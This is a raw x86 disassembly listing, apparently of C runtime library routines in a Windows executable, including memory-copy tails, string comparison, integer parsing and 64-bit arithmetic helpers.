  428471:	jmp    DWORD PTR [eax*4+0x42847c]
  428478:	jmp    DWORD PTR [ecx*4+0x428578]
  42847f:	nop
  428480:	mov    WORD PTR [edx+eax*2+0x4284b000],es
  428487:	add    al,bl
  428489:	test   BYTE PTR [edx+0x0],al
  42848c:	mov    al,BYTE PTR [esi+0x3]
  42848f:	and    edx,ecx
  428491:	mov    BYTE PTR [edi+0x3],al
  428494:	sub    esi,0x1
  428497:	shr    ecx,0x2
  42849a:	sub    edi,0x1
  42849d:	cmp    ecx,0x8
  4284a0:	jb     0x428454
  4284a2:	std    
  4284a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284a5:	cld    
  4284a6:	jmp    DWORD PTR [edx*4+0x428578]
  4284ad:	lea    ecx,[ecx+0x0]
  4284b0:	mov    al,BYTE PTR [esi+0x3]
  4284b3:	and    edx,ecx
  4284b5:	mov    BYTE PTR [edi+0x3],al
  4284b8:	mov    al,BYTE PTR [esi+0x2]
  4284bb:	shr    ecx,0x2
  4284be:	mov    BYTE PTR [edi+0x2],al
  4284c1:	sub    esi,0x2
  4284c4:	sub    edi,0x2
  4284c7:	cmp    ecx,0x8
  4284ca:	jb     0x428454
  4284cc:	std    
  4284cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284cf:	cld    
  4284d0:	jmp    DWORD PTR [edx*4+0x428578]
  4284d7:	nop
  4284d8:	mov    al,BYTE PTR [esi+0x3]
  4284db:	and    edx,ecx
  4284dd:	mov    BYTE PTR [edi+0x3],al
  4284e0:	mov    al,BYTE PTR [esi+0x2]
  4284e3:	mov    BYTE PTR [edi+0x2],al
  4284e6:	mov    al,BYTE PTR [esi+0x1]
  4284e9:	shr    ecx,0x2
  4284ec:	mov    BYTE PTR [edi+0x1],al
  4284ef:	sub    esi,0x3
  4284f2:	sub    edi,0x3
  4284f5:	cmp    ecx,0x8
  4284f8:	jb     0x428454
  4284fe:	std    
  4284ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	cld    
  428502:	jmp    DWORD PTR [edx*4+0x428578]
  428509:	lea    ecx,[ecx+0x0]
  42850c:	sub    al,0x85
  42850e:	inc    edx
  42850f:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  428516:	inc    edx
  428517:	add    BYTE PTR [ebp+eax*4+0x42],al
  42851b:	add    BYTE PTR [ebp+eax*4+0x42],cl
  42851f:	add    BYTE PTR [ebp+eax*4+0x42],dl
  428523:	add    BYTE PTR [ebp+eax*4+0x42],bl
  428527:	add    BYTE PTR [edi-0x7b],ch
  42852a:	inc    edx
  42852b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428531:	inc    esp
  428532:	(bad)  
  428533:	sbb    al,0x8b
  428535:	inc    esp
  428536:	mov    ds,WORD PTR [eax]
  428538:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428540:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428548:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428550:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428554:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428558:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42855c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428560:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428564:	lea    eax,[ecx*4+0x0]
  42856b:	add    esi,eax
  42856d:	add    edi,eax
  42856f:	jmp    DWORD PTR [edx*4+0x428578]
  428576:	mov    edi,edi
  428578:	mov    BYTE PTR [ebp-0x7a6fffbe],al
  42857e:	inc    edx
  42857f:	add    BYTE PTR [eax-0x4bffbd7b],ah
  428585:	test   DWORD PTR [edx+0x0],eax
  428588:	mov    eax,DWORD PTR [ebp+0x8]
  42858b:	pop    esi
  42858c:	pop    edi
  42858d:	leave  
  42858e:	ret    
  42858f:	nop
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    eax,DWORD PTR [ebp+0x8]
  428599:	pop    esi
  42859a:	pop    edi
  42859b:	leave  
  42859c:	ret    
  42859d:	lea    ecx,[ecx+0x0]
  4285a0:	mov    al,BYTE PTR [esi+0x3]
  4285a3:	mov    BYTE PTR [edi+0x3],al
  4285a6:	mov    al,BYTE PTR [esi+0x2]
  4285a9:	mov    BYTE PTR [edi+0x2],al
  4285ac:	mov    eax,DWORD PTR [ebp+0x8]
  4285af:	pop    esi
  4285b0:	pop    edi
  4285b1:	leave  
  4285b2:	ret    
  4285b3:	nop
  4285b4:	mov    al,BYTE PTR [esi+0x3]
  4285b7:	mov    BYTE PTR [edi+0x3],al
  4285ba:	mov    al,BYTE PTR [esi+0x2]
  4285bd:	mov    BYTE PTR [edi+0x2],al
  4285c0:	mov    al,BYTE PTR [esi+0x1]
  4285c3:	mov    BYTE PTR [edi+0x1],al
  4285c6:	mov    eax,DWORD PTR [ebp+0x8]
  4285c9:	pop    esi
  4285ca:	pop    edi
  4285cb:	leave  
  4285cc:	ret    
  4285cd:	push   ebp
  4285ce:	mov    ebp,esp
  4285d0:	sub    esp,0xc
  4285d3:	mov    eax,ds:0x45d430
  4285d8:	xor    eax,DWORD PTR [ebp+0x4]
  4285db:	and    BYTE PTR [ebp-0x6],0x0
  4285df:	push   0x6
  4285e1:	mov    DWORD PTR [ebp-0x4],eax
  4285e4:	lea    eax,[ebp-0xc]
  4285e7:	push   eax
  4285e8:	push   0x1004
  4285ed:	push   DWORD PTR [ebp+0x8]
  4285f0:	call   DWORD PTR ds:0x429100
  4285f6:	test   eax,eax
  4285f8:	jne    0x4285ff
  4285fa:	or     eax,0xffffffff
  4285fd:	jmp    0x428609
  4285ff:	lea    eax,[ebp-0xc]
  428602:	push   eax
  428603:	call   0x42890e
  428608:	pop    ecx
  428609:	mov    ecx,DWORD PTR [ebp-0x4]
  42860c:	xor    ecx,DWORD PTR [ebp+0x4]
  42860f:	call   0x425a1c
  428614:	leave  
  428615:	ret    
  428616:	push   0x38
  428618:	push   0x429fc0
  42861d:	call   0x425350
  428622:	mov    eax,ds:0x45d430
  428627:	xor    eax,DWORD PTR [ebp+0x4]
  42862a:	mov    DWORD PTR [ebp-0x1c],eax
  42862d:	xor    edi,edi
  42862f:	mov    DWORD PTR [ebp-0x20],edi
  428632:	mov    DWORD PTR [ebp-0x24],edi
  428635:	mov    eax,DWORD PTR [ebp+0x14]
  428638:	mov    ebx,DWORD PTR [eax]
  42863a:	mov    DWORD PTR [ebp-0x28],ebx
  42863d:	mov    DWORD PTR [ebp-0x2c],edi
  428640:	mov    eax,DWORD PTR [ebp+0x8]
  428643:	cmp    eax,DWORD PTR [ebp+0xc]
  428646:	je     0x4287bf
  42864c:	lea    ecx,[ebp-0x40]
  42864f:	push   ecx
  428650:	push   eax
  428651:	mov    esi,DWORD PTR ds:0x4290c8
  428657:	call   esi
  428659:	test   eax,eax
  42865b:	je     0x42867d
  42865d:	cmp    DWORD PTR [ebp-0x40],0x1
  428661:	jne    0x42867d
  428663:	lea    eax,[ebp-0x40]
  428666:	push   eax
  428667:	push   DWORD PTR [ebp+0xc]
  42866a:	call   esi
  42866c:	test   eax,eax
  42866e:	je     0x42867d
  428670:	cmp    DWORD PTR [ebp-0x40],0x1
  428674:	jne    0x42867d
  428676:	mov    DWORD PTR [ebp-0x2c],0x1
  42867d:	cmp    DWORD PTR [ebp-0x2c],edi
  428680:	je     0x42869c
  428682:	cmp    ebx,0xffffffff
  428685:	je     0x42868b
  428687:	mov    esi,ebx
  428689:	jmp    0x428697
  42868b:	push   DWORD PTR [ebp+0x10]
  42868e:	call   0x425960
  428693:	pop    ecx
  428694:	mov    esi,eax
  428696:	inc    esi
  428697:	mov    DWORD PTR [ebp-0x44],esi
  42869a:	jmp    0x42869f
  42869c:	mov    esi,DWORD PTR [ebp-0x44]
  42869f:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a2:	jne    0x4286be
  4286a4:	push   edi
  4286a5:	push   edi
  4286a6:	push   ebx
  4286a7:	push   DWORD PTR [ebp+0x10]
  4286aa:	push   0x1
  4286ac:	push   DWORD PTR [ebp+0x8]
  4286af:	call   DWORD PTR ds:0x4290f0
  4286b5:	mov    esi,eax
  4286b7:	mov    DWORD PTR [ebp-0x44],esi
  4286ba:	cmp    esi,edi
  4286bc:	je     0x428716
  4286be:	mov    DWORD PTR [ebp-0x4],edi
  4286c1:	lea    eax,[esi+esi*1]
  4286c4:	add    eax,0x3
  4286c7:	and    eax,0xfffffffc
  4286ca:	call   0x4253a0
  4286cf:	mov    DWORD PTR [ebp-0x18],esp
  4286d2:	mov    ebx,esp
  4286d4:	mov    DWORD PTR [ebp-0x48],ebx
  4286d7:	lea    eax,[esi+esi*1]
  4286da:	push   eax
  4286db:	push   edi
  4286dc:	push   ebx
  4286dd:	call   0x427c50
  4286e2:	add    esp,0xc
  4286e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286e9:	jmp    0x428702
  4286eb:	xor    eax,eax
  4286ed:	inc    eax
  4286ee:	ret    
  4286ef:	mov    esp,DWORD PTR [ebp-0x18]
  4286f2:	call   0x4287e5
  4286f7:	xor    edi,edi
  4286f9:	xor    ebx,ebx
  4286fb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ff:	mov    esi,DWORD PTR [ebp-0x44]
  428702:	cmp    ebx,edi
  428704:	jne    0x428724
  428706:	push   esi
  428707:	push   0x2
  428709:	call   0x426468
  42870e:	pop    ecx
  42870f:	pop    ecx
  428710:	mov    ebx,eax
  428712:	cmp    ebx,edi
  428714:	jne    0x42871d
  428716:	xor    eax,eax
  428718:	jmp    0x4287d1
  42871d:	mov    DWORD PTR [ebp-0x24],0x1
  428724:	push   esi
  428725:	push   ebx
  428726:	push   DWORD PTR [ebp-0x28]
  428729:	push   DWORD PTR [ebp+0x10]
  42872c:	push   0x1
  42872e:	push   DWORD PTR [ebp+0x8]
  428731:	call   DWORD PTR ds:0x4290f0
  428737:	test   eax,eax
  428739:	je     0x4287c2
  42873f:	cmp    DWORD PTR [ebp+0x18],edi
  428742:	je     0x428764
  428744:	push   edi
  428745:	push   edi
  428746:	push   DWORD PTR [ebp+0x1c]
  428749:	push   DWORD PTR [ebp+0x18]
  42874c:	push   esi
  42874d:	push   ebx
  42874e:	push   edi
  42874f:	push   DWORD PTR [ebp+0xc]
  428752:	call   DWORD PTR ds:0x429080
  428758:	test   eax,eax
  42875a:	je     0x4287c2
  42875c:	mov    eax,DWORD PTR [ebp+0x18]
  42875f:	mov    DWORD PTR [ebp-0x20],eax
  428762:	jmp    0x4287c2
  428764:	cmp    DWORD PTR [ebp-0x2c],edi
  428767:	jne    0x42877f
  428769:	push   edi
  42876a:	push   edi
  42876b:	push   edi
  42876c:	push   edi
  42876d:	push   esi
  42876e:	push   ebx
  42876f:	push   edi
  428770:	push   DWORD PTR [ebp+0xc]
  428773:	call   DWORD PTR ds:0x429080
  428779:	mov    esi,eax
  42877b:	cmp    esi,edi
  42877d:	je     0x4287c2
  42877f:	push   esi
  428780:	push   0x1
  428782:	call   0x426468
  428787:	pop    ecx
  428788:	pop    ecx
  428789:	mov    DWORD PTR [ebp-0x20],eax
  42878c:	cmp    eax,edi
  42878e:	je     0x4287c2
  428790:	push   edi
  428791:	push   edi
  428792:	push   esi
  428793:	push   eax
  428794:	push   esi
  428795:	push   ebx
  428796:	push   edi
  428797:	push   DWORD PTR [ebp+0xc]
  42879a:	call   DWORD PTR ds:0x429080
  4287a0:	cmp    eax,edi
  4287a2:	jne    0x4287b2
  4287a4:	push   DWORD PTR [ebp-0x20]
  4287a7:	call   0x425f5a
  4287ac:	pop    ecx
  4287ad:	mov    DWORD PTR [ebp-0x20],edi
  4287b0:	jmp    0x4287c2
  4287b2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287b6:	je     0x4287c2
  4287b8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287bb:	mov    DWORD PTR [ecx],eax
  4287bd:	jmp    0x4287c2
  4287bf:	mov    ebx,DWORD PTR [ebp-0x48]
  4287c2:	cmp    DWORD PTR [ebp-0x24],edi
  4287c5:	je     0x4287ce
  4287c7:	push   ebx
  4287c8:	call   0x425f5a
  4287cd:	pop    ecx
  4287ce:	mov    eax,DWORD PTR [ebp-0x20]
  4287d1:	lea    esp,[ebp-0x54]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287d7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287da:	call   0x425a1c
  4287df:	call   0x42538b
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x48
  4287eb:	push   ebx
  4287ec:	push   esi
  4287ed:	push   edi
  4287ee:	push   0x4
  4287f0:	pop    eax
  4287f1:	call   0x4253a0
  4287f6:	mov    ebx,esp
  4287f8:	push   0x1c
  4287fa:	lea    eax,[ebp-0x24]
  4287fd:	push   eax
  4287fe:	push   ebx
  4287ff:	call   DWORD PTR ds:0x42910c
  428805:	test   eax,eax
  428807:	je     0x42887a
  428809:	mov    edi,DWORD PTR [ebp-0x20]
  42880c:	lea    eax,[ebp-0x48]
  42880f:	push   eax
  428810:	call   DWORD PTR ds:0x42904c
  428816:	mov    eax,DWORD PTR [ebp-0x44]
  428819:	lea    esi,[eax-0x1]
  42881c:	not    esi
  42881e:	and    esi,ebx
  428820:	sub    esi,eax
  428822:	mov    DWORD PTR [ebp-0x4],eax
  428825:	mov    eax,ds:0x45dac4
  42882a:	mov    ecx,eax
  42882c:	dec    ecx
  42882d:	neg    ecx
  42882f:	sbb    ecx,ecx
  428831:	and    ecx,0xffff1000
  428837:	add    ecx,0x11000
  42883d:	add    ecx,edi
  42883f:	cmp    esi,ecx
  428841:	jb     0x42887a
  428843:	cmp    eax,0x1
  428846:	je     0x428892
  428848:	mov    ebx,edi
  42884a:	mov    edi,0x1000
  42884f:	push   0x1c
  428851:	lea    eax,[ebp-0x24]
  428854:	push   eax
  428855:	push   ebx
  428856:	call   DWORD PTR ds:0x42910c
  42885c:	test   eax,eax
  42885e:	je     0x42887a
  428860:	add    ebx,DWORD PTR [ebp-0x18]
  428863:	test   DWORD PTR [ebp-0x14],edi
  428866:	je     0x42884f
  428868:	test   BYTE PTR [ebp-0xf],0x1
  42886c:	mov    ebx,DWORD PTR [ebp-0x24]
  42886f:	je     0x428876
  428871:	xor    eax,eax
  428873:	inc    eax
  428874:	jmp    0x4288ae
  428876:	cmp    esi,ebx
  428878:	jae    0x42887e
  42887a:	xor    eax,eax
  42887c:	jmp    0x4288ae
  42887e:	push   0x4
  428880:	push   edi
  428881:	push   DWORD PTR [ebp-0x4]
  428884:	push   ebx
  428885:	call   DWORD PTR ds:0x4290d0
  42888b:	mov    eax,ds:0x45dac4
  428890:	jmp    0x428894
  428892:	mov    ebx,esi
  428894:	dec    eax
  428895:	neg    eax
  428897:	sbb    eax,eax
  428899:	and    eax,0x103
  42889e:	lea    ecx,[ebp-0x8]
  4288a1:	push   ecx
  4288a2:	inc    eax
  4288a3:	push   eax
  4288a4:	push   DWORD PTR [ebp-0x4]
  4288a7:	push   ebx
  4288a8:	call   DWORD PTR ds:0x429108
  4288ae:	lea    esp,[ebp-0x54]
  4288b1:	pop    edi
  4288b2:	pop    esi
  4288b3:	pop    ebx
  4288b4:	leave  
  4288b5:	ret    
  4288b6:	int3   
  4288b7:	int3   
  4288b8:	int3   
  4288b9:	int3   
  4288ba:	int3   
  4288bb:	int3   
  4288bc:	int3   
  4288bd:	int3   
  4288be:	int3   
  4288bf:	int3   
  4288c0:	push   ebp
  4288c1:	mov    ebp,esp
  4288c3:	push   edi
  4288c4:	push   esi
  4288c5:	push   ebx
  4288c6:	mov    esi,DWORD PTR [ebp+0xc]
  4288c9:	mov    edi,DWORD PTR [ebp+0x8]
  4288cc:	mov    al,0xff
  4288ce:	mov    edi,edi
  4288d0:	or     al,al
  4288d2:	je     0x428906
  4288d4:	mov    al,BYTE PTR [esi]
  4288d6:	add    esi,0x1
  4288d9:	mov    ah,BYTE PTR [edi]
  4288db:	add    edi,0x1
  4288de:	cmp    ah,al
  4288e0:	je     0x4288d0
  4288e2:	sub    al,0x41
  4288e4:	cmp    al,0x1a
  4288e6:	sbb    cl,cl
  4288e8:	and    cl,0x20
  4288eb:	add    al,cl
  4288ed:	add    al,0x41
  4288ef:	xchg   al,ah
  4288f1:	sub    al,0x41
  4288f3:	cmp    al,0x1a
  4288f5:	sbb    cl,cl
  4288f7:	and    cl,0x20
  4288fa:	add    al,cl
  4288fc:	add    al,0x41
  4288fe:	cmp    al,ah
  428900:	je     0x4288d0
  428902:	sbb    al,al
  428904:	sbb    al,0xff
  428906:	movsx  eax,al
  428909:	pop    ebx
  42890a:	pop    esi
  42890b:	pop    edi
  42890c:	leave  
  42890d:	ret    
  42890e:	push   esi
  42890f:	push   edi
  428910:	call   0x425203
  428915:	mov    edi,DWORD PTR [eax+0x64]
  428918:	cmp    edi,DWORD PTR ds:0x45d58c
  42891e:	je     0x428927
  428920:	call   0x4266af
  428925:	mov    edi,eax
  428927:	mov    esi,DWORD PTR [esp+0xc]
  42892b:	cmp    DWORD PTR [edi+0x28],0x1
  42892f:	movzx  eax,BYTE PTR [esi]
  428932:	jle    0x428942
  428934:	push   0x8
  428936:	push   eax
  428937:	push   edi
  428938:	call   0x428996
  42893d:	add    esp,0xc
  428940:	jmp    0x42894c
  428942:	mov    ecx,DWORD PTR [edi+0x48]
  428945:	movzx  eax,BYTE PTR [ecx+eax*2]
  428949:	and    eax,0x8
  42894c:	test   eax,eax
  42894e:	je     0x428953
  428950:	inc    esi
  428951:	jmp    0x42892b
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	cmp    ecx,0x2d
  42895a:	mov    edx,ecx
  42895c:	je     0x428963
  42895e:	cmp    ecx,0x2b
  428961:	jne    0x428967
  428963:	movzx  ecx,BYTE PTR [esi]
  428966:	inc    esi
  428967:	xor    eax,eax
  428969:	cmp    ecx,0x30
  42896c:	jl     0x428978
  42896e:	cmp    ecx,0x39
  428971:	jg     0x428978
  428973:	sub    ecx,0x30
  428976:	jmp    0x42897b
  428978:	or     ecx,0xffffffff
  42897b:	cmp    ecx,0xffffffff
  42897e:	je     0x42898c
  428980:	lea    eax,[eax+eax*4]
  428983:	lea    eax,[ecx+eax*2]
  428986:	movzx  ecx,BYTE PTR [esi]
  428989:	inc    esi
  42898a:	jmp    0x428969
  42898c:	cmp    edx,0x2d
  42898f:	pop    edi
  428990:	pop    esi
  428991:	jne    0x428995
  428993:	neg    eax
  428995:	ret    
  428996:	push   ebp
  428997:	mov    ebp,esp
  428999:	push   ecx
  42899a:	mov    eax,DWORD PTR [ebp+0xc]
  42899d:	lea    ecx,[eax+0x1]
  4289a0:	cmp    ecx,0x100
  4289a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a9:	ja     0x4289b4
  4289ab:	mov    ecx,DWORD PTR [ecx+0x48]
  4289ae:	movzx  eax,WORD PTR [ecx+eax*2]
  4289b2:	jmp    0x428a08
  4289b4:	push   esi
  4289b5:	mov    edx,eax
  4289b7:	sar    edx,0x8
  4289ba:	push   edi
  4289bb:	mov    edi,DWORD PTR [ecx+0x48]
  4289be:	movzx  esi,dl
  4289c1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289c6:	pop    edi
  4289c7:	pop    esi
  4289c8:	je     0x4289d9
  4289ca:	and    BYTE PTR [ebp-0x2],0x0
  4289ce:	push   0x2
  4289d0:	mov    BYTE PTR [ebp-0x3],al
  4289d3:	mov    BYTE PTR [ebp-0x4],dl
  4289d6:	pop    eax
  4289d7:	jmp    0x4289e3
  4289d9:	and    BYTE PTR [ebp-0x3],0x0
  4289dd:	mov    BYTE PTR [ebp-0x4],al
  4289e0:	xor    eax,eax
  4289e2:	inc    eax
  4289e3:	push   0x1
  4289e5:	push   DWORD PTR [ecx+0x14]
  4289e8:	push   DWORD PTR [ecx+0x4]
  4289eb:	lea    ecx,[ebp+0xe]
  4289ee:	push   ecx
  4289ef:	push   eax
  4289f0:	lea    eax,[ebp-0x4]
  4289f3:	push   eax
  4289f4:	push   0x1
  4289f6:	call   0x427a78
  4289fb:	add    esp,0x1c
  4289fe:	test   eax,eax
  428a00:	jne    0x428a04
  428a02:	leave  
  428a03:	ret    
  428a04:	movzx  eax,WORD PTR [ebp+0xe]
  428a08:	and    eax,DWORD PTR [ebp+0x10]
  428a0b:	leave  
  428a0c:	ret    
  428a0d:	int3   
  428a0e:	int3   
  428a0f:	int3   
  428a10:	mov    eax,DWORD PTR [esp+0x8]
  428a14:	mov    ecx,DWORD PTR [esp+0x10]
  428a18:	or     ecx,eax
  428a1a:	mov    ecx,DWORD PTR [esp+0xc]
  428a1e:	jne    0x428a29
  428a20:	mov    eax,DWORD PTR [esp+0x4]
  428a24:	mul    ecx
  428a26:	ret    0x10
  428a29:	push   ebx
  428a2a:	mul    ecx
  428a2c:	mov    ebx,eax
  428a2e:	mov    eax,DWORD PTR [esp+0x8]
  428a32:	mul    DWORD PTR [esp+0x14]
  428a36:	add    ebx,eax
  428a38:	mov    eax,DWORD PTR [esp+0x8]
  428a3c:	mul    ecx
  428a3e:	add    edx,ebx
  428a40:	pop    ebx
  428a41:	ret    0x10
  428a44:	int3   
  428a45:	int3   
  428a46:	int3   
  428a47:	int3   
  428a48:	int3   
  428a49:	int3   
  428a4a:	int3   
  428a4b:	int3   
  428a4c:	int3   
  428a4d:	int3   
  428a4e:	int3   
  428a4f:	int3   
  428a50:	push   ebp
  428a51:	mov    ebp,esp
  428a53:	push   edi
  428a54:	push   esi
  428a55:	push   ebx
  428a56:	mov    ecx,DWORD PTR [ebp+0x10]
  428a59:	or     ecx,ecx
  428a5b:	je     0x428aaa
  428a5d:	mov    esi,DWORD PTR [ebp+0x8]
  428a60:	mov    edi,DWORD PTR [ebp+0xc]
  428a63:	mov    bh,0x41
  428a65:	mov    bl,0x5a
  428a67:	mov    dh,0x20
  428a69:	lea    ecx,[ecx+0x0]
  428a6c:	mov    ah,BYTE PTR [esi]
  428a6e:	or     ah,ah
  428a70:	mov    al,BYTE PTR [edi]
  428a72:	je     0x428a9b
  428a74:	or     al,al
  428a76:	je     0x428a9b
  428a78:	add    esi,0x1
  428a7b:	add    edi,0x1
  428a7e:	cmp    ah,bh
  428a80:	jb     0x428a88
  428a82:	cmp    ah,bl
  428a84:	ja     0x428a88
  428a86:	add    ah,dh
  428a88:	cmp    al,bh
  428a8a:	jb     0x428a92
  428a8c:	cmp    al,bl
  428a8e:	ja     0x428a92
  428a90:	add    al,dh
  428a92:	cmp    ah,al
  428a94:	jne    0x428aa1
  428a96:	sub    ecx,0x1
  428a99:	jne    0x428a6c
  428a9b:	xor    ecx,ecx
  428a9d:	cmp    ah,al
  428a9f:	je     0x428aaa
  428aa1:	mov    ecx,0xffffffff
  428aa6:	jb     0x428aaa
  428aa8:	neg    ecx
  428aaa:	mov    eax,ecx
  428aac:	pop    ebx
  428aad:	pop    esi
  428aae:	pop    edi
  428aaf:	leave  
  428ab0:	ret    
  428ab1:	int3   
  428ab2:	int3   
  428ab3:	int3   
  428ab4:	int3   
  428ab5:	int3   
  428ab6:	int3   
  428ab7:	int3   
  428ab8:	int3   
  428ab9:	int3   
  428aba:	int3   
  428abb:	int3   
  428abc:	int3   
  428abd:	int3   
  428abe:	int3   
  428abf:	int3   
  428ac0:	push   esi
  428ac1:	mov    eax,DWORD PTR [esp+0x14]
  428ac5:	or     eax,eax
  428ac7:	jne    0x428af1
  428ac9:	mov    ecx,DWORD PTR [esp+0x10]
  428acd:	mov    eax,DWORD PTR [esp+0xc]
  428ad1:	xor    edx,edx
  428ad3:	div    ecx
  428ad5:	mov    ebx,eax
  428ad7:	mov    eax,DWORD PTR [esp+0x8]
  428adb:	div    ecx
  428add:	mov    esi,eax
  428adf:	mov    eax,ebx
  428ae1:	mul    DWORD PTR [esp+0x10]
  428ae5:	mov    ecx,eax
  428ae7:	mov    eax,esi
  428ae9:	mul    DWORD PTR [esp+0x10]
  428aed:	add    edx,ecx
  428aef:	jmp    0x428b38
  428af1:	mov    ecx,eax
  428af3:	mov    ebx,DWORD PTR [esp+0x10]
  428af7:	mov    edx,DWORD PTR [esp+0xc]
  428afb:	mov    eax,DWORD PTR [esp+0x8]
  428aff:	shr    ecx,1
  428b01:	rcr    ebx,1
  428b03:	shr    edx,1
  428b05:	rcr    eax,1
  428b07:	or     ecx,ecx
  428b09:	jne    0x428aff
  428b0b:	div    ebx
  428b0d:	mov    esi,eax
  428b0f:	mul    DWORD PTR [esp+0x14]
  428b13:	mov    ecx,eax
  428b15:	mov    eax,DWORD PTR [esp+0x10]
  428b19:	mul    esi
  428b1b:	add    edx,ecx
  428b1d:	jb     0x428b2d
  428b1f:	cmp    edx,DWORD PTR [esp+0xc]
  428b23:	ja     0x428b2d
  428b25:	jb     0x428b36
  428b27:	cmp    eax,DWORD PTR [esp+0x8]
  428b2b:	jbe    0x428b36
  428b2d:	dec    esi
  428b2e:	sub    eax,DWORD PTR [esp+0x10]
  428b32:	sbb    edx,DWORD PTR [esp+0x14]
  428b36:	xor    ebx,ebx
  428b38:	sub    eax,DWORD PTR [esp+0x8]
  428b3c:	sbb    edx,DWORD PTR [esp+0xc]
  428b40:	neg    edx
  428b42:	neg    eax
  428b44:	sbb    edx,0x0
  428b47:	mov    ecx,edx
  428b49:	mov    edx,ebx
  428b4b:	mov    ebx,ecx
  428b4d:	mov    ecx,eax
  428b4f:	mov    eax,esi
  428b51:	pop    esi
  428b52:	ret    0x10
  428b55:	int3   
  428b56:	int3   
  428b57:	int3   
  428b58:	int3   
  428b59:	int3   
  428b5a:	int3   
  428b5b:	int3   
  428b5c:	int3   
  428b5d:	int3   
  428b5e:	int3   
  428b5f:	int3   
  428b60:	lea    eax,[edx-0x1]
  428b63:	pop    ebx
  428b64:	ret    
  428b65:	lea    esp,[esp+0x0]
  428b6c:	lea    esp,[esp+0x0]
  428b70:	xor    eax,eax
  428b72:	mov    al,BYTE PTR [esp+0x8]
  428b76:	push   ebx
  428b77:	mov    ebx,eax
  428b79:	shl    eax,0x8
  428b7c:	mov    edx,DWORD PTR [esp+0x8]
  428b80:	test   edx,0x3
  428b86:	je     0x428b9d
  428b88:	mov    cl,BYTE PTR [edx]
  428b8a:	add    edx,0x1
  428b8d:	cmp    cl,bl
  428b8f:	je     0x428b60
  428b91:	test   cl,cl
  428b93:	je     0x428be6
  428b95:	test   edx,0x3
  428b9b:	jne    0x428b88
  428b9d:	or     ebx,eax
  428b9f:	push   edi
  428ba0:	mov    eax,ebx
  428ba2:	shl    ebx,0x10
  428ba5:	push   esi
  428ba6:	or     ebx,eax
  428ba8:	mov    ecx,DWORD PTR [edx]
  428baa:	mov    edi,0x7efefeff
  428baf:	mov    eax,ecx
  428bb1:	mov    esi,edi
  428bb3:	xor    ecx,ebx
  428bb5:	add    esi,eax
  428bb7:	add    edi,ecx
  428bb9:	xor    ecx,0xffffffff
  428bbc:	xor    eax,0xffffffff
  428bbf:	xor    ecx,edi
  428bc1:	xor    eax,esi
  428bc3:	add    edx,0x4
  428bc6:	and    ecx,0x81010100
  428bcc:	jne    0x428bea
  428bce:	and    eax,0x81010100
  428bd3:	je     0x428ba8
  428bd5:	and    eax,0x1010100
  428bda:	jne    0x428be4
  428bdc:	and    esi,0x80000000
  428be2:	jne    0x428ba8
  428be4:	pop    esi
  428be5:	pop    edi
  428be6:	pop    ebx
  428be7:	xor    eax,eax
  428be9:	ret    
  428bea:	mov    eax,DWORD PTR [edx-0x4]
  428bed:	cmp    al,bl
  428bef:	je     0x428c27
  428bf1:	test   al,al
  428bf3:	je     0x428be4
  428bf5:	cmp    ah,bl
  428bf7:	je     0x428c20
  428bf9:	test   ah,ah
  428bfb:	je     0x428be4
  428bfd:	shr    eax,0x10
  428c00:	cmp    al,bl
  428c02:	je     0x428c19
  428c04:	test   al,al
  428c06:	je     0x428be4
  428c08:	cmp    ah,bl
  428c0a:	je     0x428c12
  428c0c:	test   ah,ah
  428c0e:	je     0x428be4
  428c10:	jmp    0x428ba8
  428c12:	pop    esi
  428c13:	pop    edi
  428c14:	lea    eax,[edx-0x1]
  428c17:	pop    ebx
  428c18:	ret    
  428c19:	lea    eax,[edx-0x2]
  428c1c:	pop    esi
  428c1d:	pop    edi
  428c1e:	pop    ebx
  428c1f:	ret    
  428c20:	lea    eax,[edx-0x3]
  428c23:	pop    esi
  428c24:	pop    edi
  428c25:	pop    ebx
  428c26:	ret    
  428c27:	lea    eax,[edx-0x4]
  428c2a:	pop    esi
  428c2b:	pop    edi
  428c2c:	pop    ebx
  428c2d:	ret    
  428c2e:	jmp    DWORD PTR ds:0x429104
